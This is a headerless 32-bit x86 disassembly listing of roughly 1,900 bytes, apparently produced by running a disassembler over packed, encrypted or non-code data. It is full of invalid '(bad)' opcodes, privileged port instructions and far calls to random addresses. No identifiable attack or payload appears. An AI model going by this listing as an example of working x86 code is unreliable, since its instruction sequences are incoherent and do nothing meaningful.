  4178d5:	xchg   DWORD PTR [edx+0x5],edi
  4178d8:	fwait
  4178d9:	sub    eax,0x7a4f5828
  4178de:	pop    edi
  4178df:	and    dl,cl
  4178e1:	inc    ebx
  4178e2:	inc    edx
  4178e3:	jle    0x417959
  4178e5:	inc    esi
  4178e6:	aam    0x62
  4178e8:	outs   dx,BYTE PTR ds:[esi]
  4178e9:	stos   DWORD PTR es:[edi],eax
  4178ea:	cdq    
  4178eb:	arpl   WORD PTR [edi-0x70ef4314],ax
  4178f1:	imul   ebx,DWORD PTR [ebp+0x60],0x42
  4178f5:	adc    esp,DWORD PTR [esi]
  4178f7:	mov    edi,0xc10f934c
  4178fc:	das    
  4178fd:	dec    ecx
  4178fe:	xor    eax,esp
  417900:	jbe    0x417883
  417902:	xor    ch,BYTE PTR [ecx+eiz*4]
  417905:	adc    BYTE PTR [esi+edx*8],dl
  417908:	sub    ecx,DWORD PTR ds:0x4558a0a8
  41790e:	mov    ebp,DWORD PTR [ebp+0x5aa9332c]
  417914:	adc    eax,0xbaad26a
  417919:	pop    ds
  41791a:	pop    es
  41791b:	push   0xfffffff7
  41791d:	jmp    0x28a95f88
  417922:	es data16 bnd jb 0x417972
  417927:	outs   dx,BYTE PTR ds:[esi]
  417928:	cmp    al,0xb8
  41792a:	jmp    0x4178b8
  41792c:	jle    0x417995
  41792e:	fcom   DWORD PTR [ebp-0x43c67d91]
  417934:	fst    DWORD PTR [eax]
  417936:	mov    ds,esp
  417938:	jmp    DWORD PTR [ecx-0x1478630a]
  41793e:	jbe    0x4179be
  417940:	clc    
  417941:	push   cs
  417942:	pushf  
  417943:	call   0x4578:0x2e70ff
  41794a:	daa    
  41794b:	bound  edx,QWORD PTR [eax]
  41794d:	jae    0x4178ed
  41794f:	xchg   ebx,eax
  417950:	data16 and ch,BYTE PTR cs:0x5c737da9
  417958:	(bad)  
  417959:	test   DWORD PTR [esi+0x3d],esi
  41795c:	cmp    eax,0x98c43bdc
  417961:	pop    ebx
  417962:	scas   eax,DWORD PTR es:[edi]
  417963:	inc    esi
  417964:	in     al,0xcf
  417966:	adc    al,0xa4
  417968:	mov    al,0x10
  41796a:	icebp  
  41796b:	cmp    BYTE PTR [esi+edx*2+0x51f18402],bh
  417972:	leave  
  417973:	inc    eax
  417974:	cld    
  417975:	test   DWORD PTR [eax+edx*4-0x18b1b2d5],edx
  41797c:	add    BYTE PTR [eax-0x63],0x4f
  417980:	inc    esi
  417981:	sbb    ch,BYTE PTR [eax]
  417983:	add    DWORD PTR [edi+0x30],esp
  417986:	imul   ecx,DWORD PTR [edi-0x2c],0xffffffba
  41798a:	adc    al,ch
  41798c:	mov    ds,WORD PTR [ecx-0x4e]
  41798f:	and    DWORD PTR [ecx+0x6b],ebx
  417992:	ins    BYTE PTR es:[edi],dx
  417993:	shl    DWORD PTR [esi-0x1bcd89dc],cl
  417999:	ss aam 0xb8
  41799c:	pop    esi
  41799d:	push   0x12b2d262
  4179a2:	mov    ecx,0xfc4ecba8
  4179a7:	push   esp
  4179a8:	mov    cl,0x34
  4179aa:	in     eax,dx
  4179ab:	rcr    DWORD PTR [ecx+0x76],0xfe
  4179af:	outs   dx,BYTE PTR ds:[esi]
  4179b0:	fs aam 0xa
  4179b3:	out    0xf0,al
  4179b5:	adc    DWORD PTR gs:[eax],esp
  4179b8:	loopne 0x41797d
  4179ba:	ins    BYTE PTR es:[edi],dx
  4179bb:	inc    edi
  4179bc:	scas   al,BYTE PTR es:[edi]
  4179bd:	ret    0x2d10
  4179c0:	pusha  
  4179c1:	or     dl,BYTE PTR ds:0xf8edfd62
  4179c7:	pop    ss
  4179c8:	ja     0x4179da
  4179ca:	nop
  4179cb:	and    ebp,edi
  4179cd:	sahf   
  4179ce:	push   0xffffffdc
  4179d0:	mov    ebx,0xea03280d
  4179d5:	xchg   esi,eax
  4179d6:	push   ebx
  4179d7:	xor    eax,0xb82da481
  4179dc:	inc    edi
  4179dd:	push   eax
  4179de:	inc    eax
  4179df:	xor    ecx,eax
  4179e1:	cmp    DWORD PTR [esi],esi
  4179e3:	iret   
  4179e4:	adc    al,0x62
  4179e6:	xor    ebx,DWORD PTR [ecx+edx*8+0x1f]
  4179ea:	dec    edi
  4179eb:	push   ds
  4179ec:	sub    al,0xe
  4179ee:	jbe    0x417a51
  4179f0:	(bad)  
  4179f1:	es jne 0x417a29
  4179f4:	out    dx,al
  4179f5:	popf   
  4179f6:	adc    BYTE PTR [esi-0x5006103a],0x86
  4179fd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4179ff:	mov    ah,0xae
  417a01:	repnz sbb ebp,DWORD PTR [eax-0x53]
  417a05:	pop    ebx
  417a06:	jbe    0x417988
  417a08:	jecxz  0x4179ef
  417a0a:	daa    
  417a0b:	cli    
  417a0c:	call   0x3bd7:0x5b1b04f1
  417a13:	xchg   BYTE PTR [ebp+ebx*8+0x70b1470a],bl
  417a1a:	pop    es
  417a1b:	pop    eax
  417a1c:	push   ecx
  417a1d:	jle    0x4179a7
  417a1f:	push   edx
  417a20:	sub    edi,DWORD PTR [ecx]
  417a22:	sahf   
  417a23:	mov    bl,0xa9
  417a25:	stc    
  417a26:	add    bl,BYTE PTR [esi-0x59]
  417a29:	add    al,0xaf
  417a2b:	pop    eax
  417a2c:	cmp    al,0xcf
  417a2e:	jae    0x4179c8
  417a30:	dec    edx
  417a31:	adc    bl,BYTE PTR [ebx+0x72]
  417a34:	fimul  DWORD PTR [eax-0x2207877c]
  417a3a:	sub    cl,BYTE PTR [esi]
  417a3c:	mov    BYTE PTR [esi+0x5f],bh
  417a3f:	enter  0x2c36,0x1e
  417a43:	popf   
  417a44:	pop    esp
  417a45:	sbb    eax,0x4f804cf4
  417a4a:	jle    0x417aa5
  417a4c:	and    ebp,DWORD PTR [ecx+0x2245c349]
  417a52:	(bad)  
  417a53:	clc    
  417a54:	mov    ds:0x4b110ea2,eax
  417a59:	add    BYTE PTR [ebp+0x2a4329e8],al
  417a5f:	out    0x7,al
  417a61:	add    DWORD PTR [ebp+0x5a],esp
  417a64:	daa    
  417a65:	jns    0x417a30
  417a67:	and    dh,0x15
  417a6a:	cmp    bh,BYTE PTR [esi]
  417a6c:	inc    ecx
  417a6d:	dec    ebx
  417a6e:	test   al,0xf3
  417a70:	add    ch,BYTE PTR [eax-0x14]
  417a73:	cpuid  
  417a75:	xor    dl,al
  417a77:	jmp    0x417a38
  417a79:	addr16 popf 
  417a7b:	sub    BYTE PTR [ebx-0x6ecded8],ch
  417a81:	icebp  
  417a82:	push   ebx
  417a83:	push   cs
  417a84:	fs es mov ecx,0x9b4b81a6
  417a8b:	loopne 0x417a62
  417a8d:	and    ebp,0x22e60373
  417a93:	cmp    edx,eax
  417a95:	or     DWORD PTR [ebx-0x4cc3b198],ecx
  417a9b:	std    
  417a9c:	ins    DWORD PTR es:[edi],dx
  417a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a9e:	call   0xa5bf:0x3e829784
  417aa5:	out    0x2c,al
  417aa7:	es loope 0x417abc
  417aaa:	cdq    
  417aab:	pop    ecx
  417aac:	gs pop ecx
  417aae:	xor    esp,DWORD PTR [esi]
  417ab0:	in     al,dx
  417ab1:	shl    DWORD PTR [eax-0x53],cl
  417ab4:	dec    ebx
  417ab5:	inc    esp
  417ab6:	dec    ebp
  417ab7:	sub    DWORD PTR [ecx+0x3382ec5d],ebp
  417abd:	fisubr WORD PTR [edx+0x274cce69]
  417ac3:	pop    edi
  417ac4:	jge    0x417b38
  417ac6:	sub    BYTE PTR [edi+0x77aa3c25],ah
  417acc:	scas   eax,DWORD PTR es:[edi]
  417acd:	(bad)  
  417ace:	jle    0x417aa1
  417ad0:	inc    edi
  417ad1:	mov    al,dh
  417ad3:	pop    ebp
  417ad4:	adc    esi,DWORD PTR [esi+0x40]
  417ad7:	in     eax,0xae
  417ad9:	js     0x417a7f
  417adb:	push   ebp
  417adc:	mov    dl,0x3a
  417ade:	sub    dh,BYTE PTR [ecx]
  417ae0:	xchg   esi,eax
  417ae1:	and    eax,DWORD PTR [edi+0x2a]
  417ae4:	test   eax,0x70268a40
  417ae9:	rcl    edx,1
  417aeb:	mov    dh,0x3f
  417aed:	mov    ecx,0xd72c33c7
  417af2:	adc    DWORD PTR [edx+0x75],ebp
  417af5:	and    eax,esi
  417af7:	mul    dl
  417af9:	xor    dl,bh
  417afb:	sti    
  417afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417afd:	mov    ah,0x77
  417aff:	push   ds
  417b00:	mov    ch,0x2e
  417b02:	cwde   
  417b03:	gs pop ebp
  417b05:	jnp    0x417b6c
  417b07:	inc    eax
  417b08:	xor    eax,0x8e47880e
  417b0d:	sbb    al,0x8
  417b0f:	xchg   ecx,eax
  417b10:	aad    0x3a
  417b12:	pop    ss
  417b13:	dec    esp
  417b14:	(bad)  
  417b15:	jp     0x417b69
  417b17:	test   BYTE PTR [ecx],bl
  417b19:	outs   dx,BYTE PTR ds:[esi]
  417b1a:	sub    DWORD PTR [eax],esp
  417b1c:	xchg   ecx,eax
  417b1d:	retf   
  417b1e:	cmp    eax,0xeb0402f8
  417b23:	xor    BYTE PTR [edx-0x2],0x1
  417b27:	jo     0x417b76
  417b29:	call   0xfd8748df
  417b2e:	das    
  417b2f:	aas    
  417b30:	inc    DWORD PTR [ebx-0x43]
  417b33:	jno    0x417abb
  417b35:	jecxz  0x417af8
  417b37:	(bad)  
  417b38:	shl    BYTE PTR [esi],1
  417b3a:	or     eax,0x46a1ccc9
  417b3f:	pop    ebp
  417b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b41:	inc    edi
  417b42:	mov    WORD PTR [eax-0x4d],?
  417b45:	pop    esi
  417b46:	aas    
  417b47:	sbb    cl,BYTE PTR [edx+edi*1-0x66815992]
  417b4e:	fiadd  DWORD PTR [edx]
  417b50:	adc    ebp,ebp
  417b52:	push   ds
  417b53:	into   
  417b54:	jmp    0x735cd8
  417b59:	test   eax,0x92e0fdf7
  417b5e:	retf   0x6e04
  417b61:	pusha  
  417b62:	and    DWORD PTR [eax+ecx*4-0x47],0x763cedaa
  417b6a:	push   0x660d037c
  417b6f:	push   ecx
  417b70:	fst    QWORD PTR [edx-0x24]
  417b73:	test   BYTE PTR [ecx-0x7],bl
  417b76:	push   ebp
  417b77:	sub    DWORD PTR [eax-0x3b],0xffffffc7
  417b7b:	sbb    al,0x1b
  417b7d:	pop    esp
  417b7e:	je     0x417b93
  417b80:	lds    ebp,FWORD PTR [edx]
  417b82:	xor    eax,0x6902c46f
  417b87:	dec    eax
  417b88:	das    
  417b89:	pop    edx
  417b8a:	mov    dh,0xe3
  417b8c:	sub    edi,DWORD PTR ds:0x689c0489
  417b92:	or     BYTE PTR [ecx-0x659cd2e3],dl
  417b98:	mov    edi,0x444a3f09
  417b9d:	ret    0x431e
  417ba0:	rol    edx,cl
  417ba2:	mov    eax,0xe8eae2d7
  417ba7:	out    0x13,eax
  417ba9:	push   0x15f42a7d
  417bae:	jge    0x417bd4
  417bb0:	sbb    al,0xaa
  417bb2:	es or  al,0x27
  417bb5:	scas   al,BYTE PTR es:[edi]
  417bb6:	xchg   edi,eax
  417bb7:	dec    esp
  417bb8:	cmp    DWORD PTR [ebp-0x66bc8c99],ecx
  417bbe:	mov    esp,edx
  417bc0:	nop
  417bc1:	jne    0x417b75
  417bc3:	push   0xffffff96
  417bc5:	int    0x5d
  417bc7:	loop   0x417bd0
  417bc9:	push   ecx
  417bca:	and    al,bl
  417bcc:	shr    esi,0xc7
  417bcf:	test   DWORD PTR [ebp-0x5e],ebx
  417bd2:	add    BYTE PTR ds:0x3aaae8a6,dh
  417bd8:	fsub   QWORD PTR [ecx-0x5a1c2967]
  417bde:	dec    edx
  417bdf:	fs jge 0x417c32
  417be2:	jnp    0x417b8a
  417be4:	pop    edi
  417be5:	adc    edi,esi
  417be7:	mov    bh,0x1b
  417be9:	adc    eax,0x3a5d8671
  417bee:	mov    ch,0xf9
  417bf0:	out    0x92,eax
  417bf2:	aaa    
  417bf3:	js     0x417bbf
  417bf5:	sbb    ah,bl
  417bf7:	inc    cl
  417bf9:	xchg   edx,edx
  417bfb:	xchg   edx,eax
  417bfc:	outs   dx,DWORD PTR ds:[esi]
  417bfd:	(bad)  
  417bfe:	addr16 pop ecx
  417c00:	mov    esp,0x83edd200
  417c05:	push   edx
  417c06:	xor    ebp,eax
  417c08:	and    edx,0x9f5d7c2e
  417c0e:	aaa    
  417c0f:	lods   al,BYTE PTR ds:[esi]
  417c10:	mov    edi,0x9a58a5fd
  417c15:	(bad)  
  417c16:	fsub   st,st(0)
  417c18:	jmp    0x417c58
  417c1a:	mov    edi,DWORD PTR [edx]
  417c1c:	dec    eax
  417c1d:	fnstcw WORD PTR [ecx+0x1b]
  417c20:	xor    al,0xff
  417c22:	or     esp,ebx
  417c24:	outs   dx,BYTE PTR ds:[esi]
  417c25:	inc    BYTE PTR [edx-0x24]
  417c28:	sub    cl,ch
  417c2a:	adc    BYTE PTR [bp+di+0x26],dh
  417c2e:	popf   
  417c2f:	imul   ebx
  417c31:	sub    dh,BYTE PTR [ebp-0x1294e996]
  417c37:	(bad)  
  417c38:	das    
  417c39:	cli    
  417c3a:	sbb    al,0x6b
  417c3c:	clc    
  417c3d:	or     ah,bl
  417c3f:	ret    
  417c40:	enter  0x8d48,0x3a
  417c44:	sbb    eax,0x6e46554f
  417c49:	dec    esp
  417c4a:	out    dx,eax
  417c4b:	add    eax,0x2d63aedc
  417c50:	fdiv   st(0),st
  417c52:	lods   eax,DWORD PTR ds:[esi]
  417c53:	icebp  
  417c54:	pop    eax
  417c55:	lea    ecx,[ebp+ebp*4-0x2b3093dd]
  417c5c:	dec    ecx
  417c5d:	xor    BYTE PTR [esi+esi*8-0x41],bh
  417c61:	inc    esp
  417c62:	mov    WORD PTR [edi],?
  417c64:	pusha  
  417c65:	test   al,dl
  417c67:	push   esi
  417c68:	data16 cmp BYTE PTR [edx-0x3],bl
  417c6c:	inc    ebp
  417c6d:	mov    ss,WORD PTR [ecx+0x64]
  417c70:	and    eax,0x1bc1370
  417c75:	and    eax,DWORD PTR [eax+0x542775e8]
  417c7b:	pop    edi
  417c7c:	pop    ebx
  417c7d:	arpl   WORD PTR [ebx+0x5f1718a],sp
  417c83:	fwait
  417c84:	push   cs
  417c85:	call   0x12dc:0x6c9a32d1
  417c8c:	scas   eax,DWORD PTR es:[edi]
  417c8d:	fld    st(3)
  417c8f:	add    al,0x71
  417c91:	cmp    BYTE PTR [ebp+eiz*2+0x526015e5],al
  417c98:	and    edi,edi
  417c9a:	scas   al,BYTE PTR es:[edi]
  417c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c9c:	xchg   BYTE PTR [ecx-0xa89a06d],ch
  417ca2:	push   es
  417ca3:	xchg   esi,eax
  417ca4:	fdivr  QWORD PTR [edx-0x51]
  417ca7:	mov    esp,edi
  417ca9:	sahf   
  417caa:	fsubr  st(2),st
  417cac:	in     eax,0x16
  417cae:	sbb    DWORD PTR [ebx],0x2432559
  417cb4:	pop    edi
  417cb5:	ret    
  417cb6:	adc    BYTE PTR [eax-0x16],0xcb
  417cba:	pop    ebx
  417cbb:	mov    bl,0xed
  417cbd:	inc    esi
  417cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cbf:	pop    esp
  417cc0:	and    esp,DWORD PTR [eax]
  417cc2:	xchg   ecx,eax
  417cc3:	ins    BYTE PTR es:[edi],dx
  417cc4:	xchg   esi,eax
  417cc5:	test   DWORD PTR [ebx],esp
  417cc7:	call   0x23b1f0cf
  417ccc:	cwde   
  417ccd:	outs   dx,BYTE PTR ds:[esi]
  417cce:	adc    al,0xc1
  417cd0:	or     BYTE PTR [ebx+0x12a4e8ce],al
  417cd6:	jne    0x417c92
  417cd8:	pop    ds
  417cd9:	repz and ax,0x8777
  417cde:	cwde   
  417cdf:	sbb    al,0xb5
  417ce1:	pop    edi
  417ce2:	mov    dl,0x32
  417ce4:	enter  0x6b8f,0x96
  417ce8:	xchg   edx,eax
  417ce9:	dec    esi
  417cea:	push   edi
  417ceb:	mov    al,ds:0xa7c1e8f1
  417cf0:	cli    
  417cf1:	es aaa 
  417cf3:	dec    esi
  417cf4:	xor    al,BYTE PTR [ebx]
  417cf6:	cli    
  417cf7:	xchg   ebx,eax
  417cf8:	outs   dx,DWORD PTR ds:[esi]
  417cf9:	jo     0x417ca3
  417cfb:	xor    eax,0xf1cff1b1
  417d00:	sub    eax,0x1a493d39
  417d05:	jbe    0x417d7e
  417d07:	xor    ebp,DWORD PTR [edi+eax*8+0x4fe67bd]
  417d0e:	cld    
  417d0f:	mov    ebp,0xa316f7dc
  417d14:	fidiv  WORD PTR [ecx+0x27]
  417d17:	(bad)  
  417d18:	jmp    0x417d56
  417d1a:	pop    ebp
  417d1b:	data16 jne 0x417d66
  417d1e:	and    dh,BYTE PTR [edi]
  417d20:	cmp    DWORD PTR [edi],0xffffffe6
  417d23:	mov    eax,0x16e470b3
  417d28:	add    eax,0x55b04062
  417d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2e:	jl     0x417d04
  417d30:	inc    eax
  417d31:	and    edx,ebp
  417d33:	loope  0x417ce9
  417d35:	pushf  
  417d36:	pop    es
  417d37:	hlt    
  417d38:	or     cl,BYTE PTR [esi+0x2bcec7cd]
  417d3e:	jle    0x417d45
  417d40:	ds xor al,0x51
  417d43:	jno    0x417d01
  417d45:	fdivr  QWORD PTR [edx]
  417d47:	or     al,0xac
  417d49:	shl    eax,cl
  417d4b:	sbb    esi,ebx
  417d4d:	mov    esp,0x86a26a3d
  417d52:	aas    
  417d53:	lahf   
  417d54:	jmp    0x417cec
  417d56:	sbb    bl,dh
  417d58:	imul   ebx,eax,0xcecf215e
  417d5e:	std    
  417d5f:	test   al,0xe8
  417d61:	xchg   ebx,eax
  417d62:	inc    edi
  417d63:	js     0x417d2c
  417d65:	into   
  417d66:	xlat   BYTE PTR ds:[ebx]
  417d67:	stos   BYTE PTR es:[edi],al
  417d68:	adc    BYTE PTR [edx-0x2c],ch
  417d6b:	add    eax,0x2f62d5e0
  417d70:	lds    ebp,FWORD PTR [ebp+0x57e92577]
  417d76:	daa    
  417d77:	cli    
  417d78:	mov    edx,0x8f447efa
  417d7d:	xchg   ebp,eax
  417d7e:	cmp    edi,DWORD PTR [edi+0x4ec6bdec]
  417d84:	stc    
  417d85:	and    ecx,DWORD PTR [ecx]
  417d87:	mov    ah,0xe9
  417d89:	sub    eax,DWORD PTR [edx+0x41]
  417d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d8d:	gs (bad) 
  417d8f:	sti    
  417d90:	adc    al,bh
  417d92:	inc    edi
  417d93:	sub    eax,0x2b7b2904
  417d98:	imul   ebp,DWORD PTR [edx-0x40],0x5742084e
  417d9f:	mov    eax,0x519cdde8
  417da4:	cmp    edi,DWORD PTR ds:[ebx-0x37]
  417da8:	icebp  
  417da9:	or     edx,DWORD PTR [eax+eax*8-0xdde4c5d]
  417db0:	in     eax,dx
  417db1:	add    ch,BYTE PTR [edx+eiz*2-0x3f98979d]
  417db8:	jl     0x417d65
  417dba:	mov    bh,0x1f
  417dbc:	iret   
  417dbd:	cdq    
  417dbe:	and    ch,0x72
  417dc1:	mov    ebp,0xb6617f18
  417dc6:	call   0x37fd007e
  417dcb:	retf   0x3ac4
  417dce:	mov    bh,0xe5
  417dd0:	cmp    DWORD PTR [ebx+esi*4+0x6db04185],eax
  417dd7:	jae    0x417e1f
  417dd9:	pop    es
  417dda:	enter  0x2e47,0xab
  417dde:	jge    0x417e5f
  417de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de1:	aas    
  417de2:	push   cs
  417de3:	xchg   ebx,eax
  417de4:	xor    eax,0xdd51d854
  417de9:	or     ecx,DWORD PTR [eax-0x34]
  417dec:	popa   
  417ded:	dec    edx
  417dee:	sbb    al,0x2
  417df0:	xor    BYTE PTR [di-0x73],dh
  417df4:	cdq    
  417df5:	cmp    dh,BYTE PTR [edi+0x13cf44d6]
  417dfb:	jbe    0x417e29
  417dfd:	sub    DWORD PTR [ecx+0x60],esp
  417e00:	shr    BYTE PTR [esi],cl
  417e02:	repnz xlat BYTE PTR ds:[ebx]
  417e04:	xchg   ecx,eax
  417e05:	fs inc esi
  417e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e08:	stos   BYTE PTR es:[edi],al
  417e09:	push   0xffffffca
  417e0b:	fs loopne 0x417db7
  417e0e:	mov    dh,0xfe
  417e10:	sbb    dl,0x29
  417e13:	dec    ecx
  417e14:	mov    ss,WORD PTR [esi]
  417e16:	sub    eax,0xf5953e18
  417e1b:	fimul  WORD PTR [eax-0x77b5a11d]
  417e21:	dec    ebx
  417e22:	jb     0x417e29
  417e24:	mov    esi,0x3d3535df
  417e29:	mov    WORD PTR [esi+0x3cc0f431],?
  417e2f:	inc    ebp
  417e30:	cmp    ebp,DWORD PTR [edi-0x42]
  417e33:	enter  0x12e8,0xfc
  417e37:	or     esi,DWORD PTR [edx+edx*1-0x2760bf30]
  417e3e:	jnp    0x417dd1
  417e40:	mov    edx,0x4a0a292f
  417e45:	xor    bh,ah
  417e47:	push   ecx
  417e48:	inc    eax
  417e49:	sub    al,0x86
  417e4b:	test   BYTE PTR [esp+0x60],ch
  417e4f:	fidiv  WORD PTR [ebp-0x1a]
  417e52:	jb     0x417e14
  417e54:	xor    cl,cl
  417e56:	loop   0x417ea5
  417e58:	cmp    eax,0x3ad530f7
  417e5d:	imul   edx,DWORD PTR [ebx],0xb07d1699
  417e63:	push   ds
  417e64:	cmp    al,0xe1
  417e66:	mov    dl,0x20
  417e69:	icebp  
  417e6a:	jmp    0x417dec
  417e6c:	ds (bad) 
  417e6e:	fisub  DWORD PTR [edi+0x422b4271]
  417e74:	mov    BYTE PTR [ecx-0x591c34ce],bl
  417e7a:	cmp    ch,BYTE PTR [ebp-0x58]
  417e7d:	das    
  417e7e:	fisub  DWORD PTR [edi+0x61]
  417e81:	pop    esp
  417e82:	(bad)  
  417e83:	gs repz sub edi,edi
  417e87:	cmp    edx,DWORD PTR [esi-0x698c7b7c]
  417e8d:	hlt    
  417e8e:	sbb    al,0x25
  417e90:	sti    
  417e91:	retf   0x209a
  417e94:	sub    esp,DWORD PTR [ebp-0x26]
  417e97:	retf   
  417e98:	dec    eax
  417e99:	dec    edx
  417e9a:	pop    esi
  417e9b:	mov    bh,0x59
  417e9d:	or     DWORD PTR [eax+edi*8+0x6122884b],edx
  417ea4:	jmp    0xd8bea2ce
  417ea9:	loop   0x417f1b
  417eab:	mov    ecx,0x27bf59f7
  417eb0:	sbb    eax,DWORD PTR [eax-0x27]
  417eb3:	lea    ebp,[ebp-0x3268a4b7]
  417eb9:	popf   
  417eba:	repnz push cs
  417ebc:	jmp    0x417ea5
  417ebe:	in     al,0xfd
  417ec0:	les    ebx,FWORD PTR [esi+edx*4+0x32]
  417ec4:	jbe    0x417e71
  417ec6:	mov    es,WORD PTR [esi+0x709aeef5]
  417ecc:	gs dec edx
  417ece:	(bad)  [esi]
  417ed0:	jno    0x417f4c
  417ed2:	ret    
  417ed3:	clc    
  417ed4:	and    al,0x55
  417ed6:	into   
  417ed7:	push   ecx
  417ed8:	cmp    DWORD PTR [eax-0x2706420a],ebp
  417ede:	rep outs dx,BYTE PTR ds:[esi]
  417ee0:	cmp    al,0x9e
  417ee2:	pop    esp
  417ee3:	sub    al,0xc0
  417ee5:	imul   edi,DWORD PTR [eax],0x4b484516
  417eeb:	xor    esp,esi
  417eed:	(bad)  
  417eee:	or     ebx,DWORD PTR [eax]
  417ef0:	stos   BYTE PTR es:[edi],al
  417ef1:	jo     0x417e86
  417ef3:	xor    esi,edx
  417ef5:	loop   0x417e97
  417ef7:	cdq    
  417ef8:	aas    
  417ef9:	je     0x417ec6
  417efb:	daa    
  417efc:	or     eax,0x52a46809
  417f01:	lods   eax,DWORD PTR ds:[esi]
  417f02:	fucomip st,st(7)
  417f04:	into   
  417f05:	fstp   DWORD PTR [ecx]
  417f07:	push   ds
  417f08:	sar    BYTE PTR [esi+0x6a],1
  417f0b:	arpl   ax,dx
  417f0d:	gs push edx
  417f0f:	outs   dx,BYTE PTR ds:[esi]
  417f10:	hlt    
  417f11:	out    dx,eax
  417f12:	jae    0x417ecf
  417f14:	in     eax,dx
  417f15:	retf   0x1bb4
  417f18:	cli    
  417f19:	fwait
  417f1a:	ror    ah,1
  417f1c:	adc    dh,bl
  417f1e:	adc    DWORD PTR [edi-0x134a566e],edi
  417f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f25:	idiv   BYTE PTR [ebx]
  417f27:	cmp    DWORD PTR [ebp+0x5d7f2df1],0xffffff9c
  417f2e:	lods   al,BYTE PTR ds:[esi]
  417f2f:	das    
  417f30:	mov    dl,0xf2
  417f32:	mov    ecx,0xb8b8f863
  417f37:	std    
  417f38:	cwde   
  417f39:	(bad)  
  417f3a:	sti    
  417f3b:	or     al,0xa2
  417f3d:	pop    es
  417f3e:	fmul   st,st(3)
  417f40:	ja     0x417faf
  417f42:	sub    esi,edx
  417f44:	cli    
  417f45:	repnz stos BYTE PTR es:[edi],al
  417f47:	jns    0x417fc6
  417f49:	lds    ecx,FWORD PTR [edx-0x3cf3d81e]
  417f4f:	and    eax,0x374696de
  417f54:	push   ebp
  417f55:	loopne 0x417f6c
  417f57:	fld    DWORD PTR [ebx-0x75bbefbd]
  417f5d:	hlt    
  417f5e:	loop   0x417f80
  417f60:	retf   0x60f
  417f63:	scas   eax,DWORD PTR es:[edi]
  417f64:	fisub  DWORD PTR [edx+0x4f]
  417f67:	jno    0x417fcc
  417f69:	mov    ds:0x4dc13d2d,al
  417f6e:	fcomp  QWORD PTR [ebx-0x2e]
  417f71:	mov    dh,0xe0
  417f73:	push   ebp
  417f74:	out    0x8,al
  417f76:	in     eax,dx
  417f77:	xchg   edi,eax
  417f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f79:	add    BYTE PTR [edi+0x57],0x55
  417f7d:	sbb    cl,0xf1
  417f80:	mov    ch,0xac
  417f82:	push   esp
  417f83:	ins    DWORD PTR es:[edi],dx
  417f84:	pop    eax
  417f85:	mov    al,0xeb
  417f87:	test   DWORD PTR [edx],esi
  417f89:	push   0x11218664
  417f8e:	push   esi
  417f8f:	mov    cl,0x44
  417f91:	(bad)  
  417f92:	cmp    eax,0x6a295d26
  417f97:	cld    
  417f98:	fdiv   QWORD PTR [eax]
  417f9a:	or     al,0xa8
  417f9c:	pop    ecx
  417f9d:	arpl   bp,bp
  417f9f:	xor    eax,0xc11fe3db
  417fa4:	mov    bh,0xce
  417fa6:	loop   0x417f31
  417fa8:	jle    0x417fcc
  417faa:	or     cl,cl
  417fac:	add    BYTE PTR [ebp+0x36],dl
  417faf:	mov    al,ds:0x9ec04a50
  417fb4:	adc    DWORD PTR [eax-0x72],0x8895b49c
  417fbb:	pop    esi
  417fbc:	mov    BYTE PTR [edi],bl
  417fbe:	mov    bh,0x6e
  417fc0:	mov    bh,0x3f
  417fc2:	sub    dl,bl
  417fc4:	mov    ch,dl
  417fc6:	lds    ebp,FWORD PTR [ecx]
  417fc8:	(bad)  
  417fc9:	retf   
  417fca:	and    BYTE PTR ss:[si-0x24],0xf4
  417fd0:	nop
  417fd1:	pop    es
  417fd2:	je     0x417f7e
  417fd4:	mov    bh,0x3a
  417fd6:	xor    eax,0xf517430d
  417fdb:	shl    DWORD PTR [ebp-0x61],cl
  417fde:	jmp    0x418043
  417fe0:	pusha  
  417fe1:	or     esi,edi
  417fe3:	jg     0x417fbe
  417fe5:	add    ebx,DWORD PTR [edi+0x45aa27b0]
  417feb:	sbb    BYTE PTR [edx],bh
  417fed:	repz jbe 0x417fa5
  417ff0:	inc    esi
  417ff1:	jb     0x418039
  417ff3:	push   0xffffffce
  417ff5:	dec    ebx
  417ff6:	shl    DWORD PTR [ebp+0x7606894],cl
  417ffc:	and    eax,0x46
  417fff:	pop    ecx
  418000:	pop    es
  418001:	jo     0x417f88
  418003:	sar    ah,1
  418005:	add    eax,0x1c997e44
  41800a:	sbb    BYTE PTR [esi+eiz*4],0xf4
  41800e:	pop    esi
  41800f:	dec    ebx
  418010:	ins    BYTE PTR es:[edi],dx
  418011:	int3   
  418012:	ins    DWORD PTR es:[edi],dx
  418013:	cmp    eax,0x4a430e54
  418018:	imul   ecx,DWORD PTR ds:0x23cecc6,0x60
  41801f:	aas    
  418020:	push   edi
  418021:	jo     0x41809e
  418023:	cs repz cmp al,0xd4
  418027:	adc    dh,BYTE PTR [edx-0x3c701844]
  41802d:	stos   BYTE PTR es:[edi],al
  41802e:	lods   eax,DWORD PTR ds:[esi]
  41802f:	hlt    
  418030:	jns    0x4180a5
  418032:	cmp    bl,BYTE PTR [edi]
  418034:	xchg   ebp,eax
  418035:	dec    eax
  418036:	out    dx,al
  418037:	les    edi,FWORD PTR [ebp-0x3b527944]
  41803d:	push   edx
  41803e:	(bad)  
  41803f:	xor    al,0xd8
  418041:	add    BYTE PTR [edi-0x77],ch
  418044:	cmp    BYTE PTR [esi+0x5188e214],dh
  41804a:	repnz inc edx
  41804c:	daa    
  41804d:	leave  
  41804e:	lods   eax,DWORD PTR ds:[esi]
  41804f:	std    
  418050:	call   FWORD PTR [ecx]
  418052:	in     al,0x2d
  418054:	lock cdq 
  418056:	into   
  418057:	daa    
  418058:	imul   DWORD PTR [ebp+0x71c6e521]
  41805e:	dec    ebp
  41805f:	popa   
  418060:	call   0xcb8c:0x8373309a
